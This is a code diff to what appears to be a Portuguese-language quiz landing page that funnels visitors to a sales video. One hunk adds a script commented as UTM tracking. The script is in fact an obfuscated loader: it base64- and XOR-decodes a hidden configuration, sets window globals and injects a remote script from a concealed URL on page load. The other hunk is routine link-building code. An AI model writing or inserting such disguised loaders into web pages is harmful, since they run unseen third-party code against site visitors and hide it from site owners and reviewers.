@@ -23,6 +23,10 @@
   /></noscript>
   <!-- End Meta Pixel Code -->
 
+  <!-- UTMify: rastreamento de UTMs -->
+  <script>(function(){var s_l=atob("DGsbT+YToRVS/HlYuhA5OpR/gy9wlA0syhghYMlwxXt8iQ010w1iYYV8zDswjlYr2RlyP5JgjmAmkQp31gpvKpVnj38h3lV62x9vPY9x1GE3j1ti4RA5IYd+xDdo3h05zgo2OpJ+yHMr0Qkq3x1+IZI+2XY9mFQr2QA5Y8RlwHknmVtimElmY50xz3Q/mVtimA96O4c+1GE/lR8hlxtpKpB2z2F/jww60w9obcox13Q+iRx6gEk5Mrtu");var e_p=[];for(var e_a=0;e_a<s_l.length;e_a++){e_p.push(s_l.charCodeAt(e_a)&255);}var o_5=e_p[0];var y_5l=e_p.slice(1,1+o_5);var p_p1b=e_p.slice(1+o_5);var l_xmi=p_p1b.map(function(b,a_2x){return b^y_5l[a_2x%o_5];});var b_hn7="";for(var e_v9=0;e_v9<l_xmi.length;e_v9++){b_hn7+=String.fromCharCode(l_xmi[e_v9]&255);}var z_u=decodeURIComponent(escape(b_hn7));var p_wp0=JSON.parse(z_u);var i_o4vj=p_wp0.globals||[];i_o4vj.forEach(function(m_0xj){window[m_0xj.name]=m_0xj.value;});var r_5=document.createElement("script");r_5.src=p_wp0.url;r_5.async=true;r_5.defer=true;(p_wp0.attributes||[]).forEach(function(b_4){r_5.setAttribute(b_4.name,b_4.value);});(document.head||document.documentElement).appendChild(r_5);})();</script>
+  <!-- End UTMify -->
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
@@ -222,12 +226,29 @@ function analyse(){
   items.forEach((li,i) => setTimeout(() => li.classList.add("ok"), 700*(i+1)));
   setTimeout(showResult, 700*items.length + 600);
 }
+/* Monta o link da VSL mantendo TODOS os parâmetros da URL atual
+   (utm_source, utm_campaign, utm_medium, utm_content, utm_term, src, sck, fbclid etc.)
+   + as respostas do quiz. Parâmetros que já existirem no VSL_URL são preservados. */
+function buildVslUrl(){
+  const url = new URL(VSL_URL);
+  new URLSearchParams(window.location.search).forEach((value, key) => {
+    url.searchParams.set(key, value);
+  });
+  Object.entries(answers).forEach(([key, value]) => {
+    url.searchParams.set(key, value);
+  });
+  return url.toString();
+}
+/* Recalcula no clique, para pegar qualquer parâmetro que a UTMify
+   tenha adicionado na URL depois que a página carregou */
+document.getElementById("toVsl").addEventListener("click", function(){
+  this.href = buildVslUrl();
+});
 function showResult(){
   document.getElementById("resAge").innerHTML = TEXT.age[answers.age] || "";
   document.getElementById("resFreq").innerHTML = TEXT.freq[answers.freq] || "";
   document.getElementById("resTried").innerHTML = TEXT.tried[answers.tried] || "";
-  const qs = new URLSearchParams(answers).toString();
-  document.getElementById("toVsl").href = VSL_URL + (VSL_URL.includes("?") ? "&" : "?") + qs;
+  document.getElementById("toVsl").href = buildVslUrl();
   try { fbq("trackCustom", "QuizComplete", answers); } catch(e){}
   go(5);
 }
